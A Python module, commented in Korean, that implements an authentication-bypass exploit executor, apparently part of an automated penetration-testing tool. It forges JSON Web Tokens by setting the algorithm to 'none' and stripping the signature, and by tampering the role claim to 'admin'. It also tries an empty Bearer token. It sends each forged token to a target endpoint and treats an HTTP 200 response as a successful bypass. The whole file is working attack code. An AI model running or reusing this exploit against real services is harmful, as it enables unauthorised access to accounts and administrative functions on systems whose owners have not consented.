"""Auth Bypass 익스플로잇 executor.

JWT 알고리즘 조작, 빈 토큰, role 변조 3가지 방법을 시도한다.
base64url 인코딩/디코딩은 표준 라이브러리만 사용하여 외부 의존성을 추가하지 않는다.
"""
import base64
import json
import logging
from typing import TypedDict

import httpx

logger = logging.getLogger(__name__)

_TIMEOUT_SECONDS = 30


class ExploitOutcome(TypedDict):
    success: bool
    payload: str
    response_snippet: str
    evidence: str
    error: str | None


def _b64url_decode(segment: str) -> bytes:
    """패딩이 없는 base64url 세그먼트를 디코딩한다."""
    padding = 4 - len(segment) % 4
    if padding != 4:
        segment += "=" * padding
    return base64.urlsafe_b64decode(segment)


def _b64url_encode(data: bytes) -> str:
    """패딩을 제거한 base64url 문자열을 반환한다."""
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def _build_alg_none_token(original_token: str) -> str | None:
    """JWT의 alg를 'none'으로 변경하고 서명을 제거한다."""
    parts = original_token.split(".")
    if len(parts) < 2:
        return None
    try:
        header = json.loads(_b64url_decode(parts[0]))
        header["alg"] = "none"
        new_header = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
        payload_segment = parts[1]
        # alg=none은 서명이 없어야 하므로 세 번째 세그먼트를 빈 문자열로 설정한다
        return f"{new_header}.{payload_segment}."
    except Exception:
        return None


def _build_admin_role_token(original_token: str) -> str | None:
    """JWT payload의 role 클레임을 'admin'으로 변조하고 alg=none으로 서명을 제거한다."""
    parts = original_token.split(".")
    if len(parts) < 2:
        return None
    try:
        header = json.loads(_b64url_decode(parts[0]))
        payload = json.loads(_b64url_decode(parts[1]))
        header["alg"] = "none"
        payload["role"] = "admin"
        new_header = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
        new_payload = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
        return f"{new_header}.{new_payload}."
    except Exception:
        return None


async def _try_request(
    client: httpx.AsyncClient,
    url: str,
    token: str,
    endpoint: str,
) -> httpx.Response | None:
    """Authorization 헤더에 Bearer 토큰을 실어 GET 요청을 보낸다."""
    try:
        return await client.get(url, headers={"Authorization": f"Bearer {token}"})
    except httpx.HTTPError as exc:
        logger.warning("[auth_bypass] request failed endpoint=%s: %s", endpoint, exc)
        return None


async def execute(target_url: str, endpoint: str, params: dict) -> ExploitOutcome:
    """JWT 조작 3종을 시도하고 403/401 → 200 전환 여부로 우회 성공을 판단한다.

    원본 토큰 없이도 빈 Bearer 토큰 시도는 항상 수행한다.
    """
    url = target_url.rstrip("/") + "/" + endpoint.lstrip("/")
    original_token: str | None = params.get("jwt_token")
    last_error: str | None = None

    candidates: list[tuple[str, str]] = []

    # 1. alg=none 토큰
    if original_token:
        alg_none = _build_alg_none_token(original_token)
        if alg_none:
            candidates.append((alg_none, "JWT alg=none, signature stripped"))

    # 2. 빈 Bearer 토큰 — 토큰 유무와 관계없이 항상 시도한다
    candidates.append(("", "Empty Bearer token"))

    # 3. admin role 변조 토큰
    if original_token:
        admin_token = _build_admin_role_token(original_token)
        if admin_token:
            candidates.append((admin_token, "JWT role=admin, alg=none"))

    async with httpx.AsyncClient(timeout=_TIMEOUT_SECONDS, follow_redirects=True) as client:
        for token, description in candidates:
            response = await _try_request(client, url, token, endpoint)
            if response is None:
                last_error = f"Request failed for: {description}"
                continue

            if response.status_code == 200:
                return ExploitOutcome(
                    success=True,
                    payload=description,
                    response_snippet=response.text[:500],
                    evidence=f"HTTP 200 received with bypass technique: {description}",
                    error=None,
                )

    return ExploitOutcome(
        success=False,
        payload=str([desc for _, desc in candidates]),
        response_snippet="",
        evidence="All bypass attempts returned non-200 status",
        error=last_error,
    )
